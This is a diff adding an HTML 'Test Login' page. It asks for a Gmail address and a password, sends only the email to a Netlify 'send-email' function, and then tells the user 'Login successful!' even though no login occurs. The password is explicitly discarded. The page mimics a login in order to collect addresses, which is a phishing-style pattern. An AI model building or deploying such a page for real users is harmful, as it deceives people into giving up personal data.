@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Test Login</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      background: #f2f5f8;
+    }
+    .box {
+      width: 90%;
+      max-width: 380px;
+      padding: 30px;
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 5px 25px rgba(0,0,0,.12);
+    }
+    h2 { margin: 0 0 8px; text-align: center; }
+    .note { text-align: center; color: #666; font-size: 14px; margin-bottom: 20px; }
+    label { display: block; margin-top: 14px; font-size: 14px; }
+    input {
+      width: 100%;
+      padding: 13px;
+      margin-top: 7px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 13px;
+      margin-top: 20px;
+      border: 0;
+      border-radius: 8px;
+      background: #1677ff;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:disabled { opacity: .6; cursor: not-allowed; }
+    #message { margin-top: 15px; text-align: center; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Login</h2>
+        <form id="loginForm">
+      <label for="email">Email</label>
+      <input
+        id="email"
+        type="email"
+        placeholder="Enter Gmail"
+        autocomplete="off"
+        required
+      >
+
+      <label for="password">Password</label>
+      <input
+        id="password"
+        type="password"
+        placeholder="Enter password"
+        autocomplete="off"
+      >
+
+      <button id="loginButton" type="submit">Login</button>
+    </form>
+
+    <div id="message"></div>
+  </div>
+
+  <script>
+    const form = document.getElementById("loginForm");
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+    const button = document.getElementById("loginButton");
+    const message = document.getElementById("message");
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      const email = emailInput.value.trim();
+
+      // Password is intentionally NOT read or sent.
+      passwordInput.value = "";
+
+      button.disabled = true;
+      button.textContent = "Please wait...";
+      message.textContent = "";
+
+      try {
+        const response = await fetch("/.netlify/functions/send-email", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email })
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+          message.textContent = "Login successful!";
+          form.reset();
+        } else {
+          message.textContent = result.error || "Something went wrong.";
+        }
+      } catch (error) {
+        message.textContent = "Connection error.";
+      } finally {
+        button.disabled = false;
+        button.textContent = "Login";
+      }
+    });
+  </script>
+</body>
+</html>
